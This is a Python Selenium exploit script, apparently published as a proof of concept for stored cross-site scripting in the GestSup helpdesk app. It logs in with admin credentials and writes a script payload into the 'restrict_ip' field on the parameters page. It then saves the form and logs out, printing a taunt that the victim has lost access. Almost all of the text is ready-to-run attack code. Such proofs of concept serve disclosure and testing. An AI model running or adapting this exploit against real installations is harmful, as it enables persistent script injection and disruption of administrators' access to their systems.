#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug: nu11secur1ty, g3ck0dr1v3r
# CVE: XSS Stored injection: Vulnerable app parameters.php, parameter ('restrict_ip')

from selenium import webdriver
import time


#enter the link to the website you want to automate login.
website_link="http://192.168.1.160/Gestsup/"

#enter your login username
username="admin"

#enter your login password
password="admin"

#enter the element for username input field
element_for_username="login"
#enter the element for password input field
element_for_password="pass"
#enter the element for submit button
element_for_submit="submit"

#browser = webdriver.Safari()	#for macOS users[for others use chrome vis chromedriver]
browser = webdriver.Chrome()	#uncomment this line,for chrome users
#browser = webdriver.Firefox()	#uncomment this line,for chrome users

browser.get((website_link))	

try:
	username_element = browser.find_element_by_name(element_for_username)
	username_element.send_keys(username)		
	password_element  = browser.find_element_by_name(element_for_password)
	password_element.send_keys(password)
	signInButton = browser.find_element_by_name(element_for_submit)
	signInButton.click()
	
	# Exploit link
	browser.get(("http://192.168.1.160/Gestsup/index.php?page=admin&subpage=parameters"))
	time.sleep(3)
	# PWN you :D
	# Vulnerable app parameters.php parameter ('restrict_ip')
	browser.execute_script("document.querySelector('[name=\"restrict_ip\"]').value = '<script>alert(document.domain)</script>'") 
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"submit_general\"]').click()")
	time.sleep(3)
	browser.get(("http://192.168.1.160/Gestsup/index.php?action=logout&token="))

	print("payload is deployed NOW, you have no access to your system =)...\n")
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")
